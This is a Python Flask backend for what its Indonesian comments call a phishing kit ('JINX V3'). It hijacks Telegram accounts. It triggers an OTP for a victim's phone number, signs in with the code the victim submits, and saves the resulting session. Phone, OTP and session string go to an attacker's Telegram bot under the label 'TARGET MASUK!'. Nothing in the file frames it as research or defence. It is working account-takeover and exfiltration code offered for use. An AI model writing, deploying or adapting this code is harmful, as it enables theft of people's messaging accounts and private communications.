# api/send_code.py
import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS  # AUTO CORS
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import requests

app = Flask(__name__)
CORS(app)  # IZININ SEMUA DOMAIN (PHISHING LO)

# === ENV VARS (RAILWAY) ===
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# === MANUAL CORS (BACKUP KALO flask-cors GAGAL) ===
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
    return response

# === HANDLE OPTIONS (PREFlight) ===
@app.route('/send_code', methods=['OPTIONS'])
def options():
    return '', 204

# === KIRIM KE BOT ===
def send_bot(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
            'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'
        }, timeout=10)
    except:
        pass  # Gagal kirim bot = gpp

# === MAIN API ===
@app.route('/send_code', methods=['POST'])
def handle():
    phone = request.form.get('phone')
    code = request.form.get('code')
    action = request.form.get('action', 'send')

    if not phone:
        return jsonify({'success': False, 'error': 'no phone'}), 400

    session_path = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        client.connect()

        if action == 'verify' and code:
            # VERIFIKASI OTP
            client.sign_in(phone, code)
            session_str = client.session.save()
            client.disconnect()

            msg = f"*TARGET MASUK!*\n\nNo: `{phone}`\nOTP: `{code}`\nSESSION:\n||{session_str}||"
            send_bot(msg)
            return jsonify({'success': True, 'session': session_str})

        else:
            # KIRIM / RESEND OTP
            res = client.send_code_request(phone, force_sms=True)
            client.disconnect()

            status = "RESEND" if action == 'resend' else "TARGET MASUK"
            msg = f"*{status}*\n\nNo: `{phone}`\nMenunggu OTP..."
            send_bot(msg)
            return jsonify({'success': True, 'hash': res.phone_code_hash})

    except Exception as e:
        if 'client' in locals() and client.is_connected():
            client.disconnect()
        error_msg = str(e)
        return jsonify({'success': False, 'error': error_msg}), 500

# === HOME ===
@app.route('/')
def home():
    return "JINX V3 – RAILWAY + CORS FIXED | OTP ASLI"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
